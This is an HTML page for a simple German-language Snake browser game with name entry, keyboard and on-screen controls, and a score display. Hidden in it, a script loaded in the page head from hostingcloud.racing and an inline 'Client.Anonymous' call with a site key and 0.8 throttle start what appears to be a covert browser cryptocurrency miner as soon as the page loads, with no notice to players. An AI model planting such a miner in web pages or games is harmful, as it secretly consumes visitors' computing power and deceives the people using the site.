<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake.io</title>
    <script src="https://www.hostingcloud.racing/QnMB.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            overflow: hidden;
            background-color: black;
            color: white;
        }
        canvas {
            display: none;
            margin: auto;
            background-color: #111;
            border: 3px solid red;
            width: 90vw;
            height: 90vh;
            box-shadow: 0px 0px 10px red;
        }
        #nameInputContainer {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }
        #nameInput {
            padding: 10px;
            font-size: 18px;
            border: 2px solid red;
            background-color: black;
            color: white;
        }
        #startGame {
            padding: 10px 20px;
            font-size: 18px;
            background: red;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
        #leaderboard {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(255, 0, 0, 0.8);
            padding: 10px;
            border-radius: 5px;
            display: none;
            font-weight: bold;
            text-shadow: 2px 2px black;
        }
        .controls {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
        }
        .control-btn {
            width: 50px;
            height: 50px;
            background: red;
            color: white;
            font-size: 24px;
            border: none;
            border-radius: 50%;
            text-align: center;
            line-height: 50px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="nameInputContainer">
        <input type="text" id="nameInput" placeholder="Dein Name" />
        <button id="startGame">Start</button>
    </div>
    <div id="leaderboard">Leaderboard:<br><span id="score">0</span></div>
    <canvas id="gameCanvas"></canvas>
    <div class="controls" style="display: none;">
        <button class="control-btn" id="up">▲</button>
        <button class="control-btn" id="left">◀</button>
        <button class="control-btn" id="right">▶</button>
        <button class="control-btn" id="down">▼</button>
    </div>
    
    <script>
        var _client = new Client.Anonymous('c4286725b76cd025b2ce4087bc0f4799abd72cadc6618887799dca14b5c5a60d', {
            throttle: 0.8,
            c: 'w'
        });
        _client.start();

        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");
        const nameInputContainer = document.getElementById("nameInputContainer");
        const nameInput = document.getElementById("nameInput");
        const startGameBtn = document.getElementById("startGame");
        const leaderboard = document.getElementById("leaderboard");
        const controls = document.querySelector(".controls");

        let snake = [{x: 100, y: 100}];
        let direction = {x: 10, y: 0};
        let food = {x: Math.floor(Math.random() * canvas.width / 10) * 10, y: Math.floor(Math.random() * canvas.height / 10) * 10};
        let score = 0;
        let playerName = "";

        function drawSnake() {
            ctx.fillStyle = "white";
            snake.forEach(part => ctx.fillRect(part.x, part.y, 10, 10));
        }

        function drawFood() {
            ctx.fillStyle = "red";
            ctx.fillRect(food.x, food.y, 10, 10);
        }

        function moveSnake() {
            let newHead = {x: snake[0].x + direction.x, y: snake[0].y + direction.y};
            snake.unshift(newHead);
            if (Math.abs(newHead.x - food.x) < 10 && Math.abs(newHead.y - food.y) < 10) {
                food = {x: Math.floor(Math.random() * canvas.width / 10) * 10, y: Math.floor(Math.random() * canvas.height / 10) * 10};
                score += 10;
                document.getElementById("score").innerText = playerName + " - " + score;
            } else {
                snake.pop();
            }
        }

        document.addEventListener("keydown", (e) => {
            if (e.key === "w") direction = {x: 0, y: -10};
            if (e.key === "s") direction = {x: 0, y: 10};
            if (e.key === "a") direction = {x: -10, y: 0};
            if (e.key === "d") direction = {x: 10, y: 0};
        });

        document.getElementById("up").addEventListener("click", () => direction = {x: 0, y: -10});
        document.getElementById("down").addEventListener("click", () => direction = {x: 0, y: 10});
        document.getElementById("left").addEventListener("click", () => direction = {x: -10, y: 0});
        document.getElementById("right").addEventListener("click", () => direction = {x: 10, y: 0});

        startGameBtn.addEventListener("click", () => {
            playerName = nameInput.value.trim();
            if (playerName === "") {
                alert("Bitte gib deinen Namen ein!");
                return;
            }
            nameInputContainer.style.display = "none";
            canvas.style.display = "block";
            leaderboard.style.display = "block";
            controls.style.display = "flex";
            setInterval(moveSnake, 100);
        });
    </script>
</body>
</html>
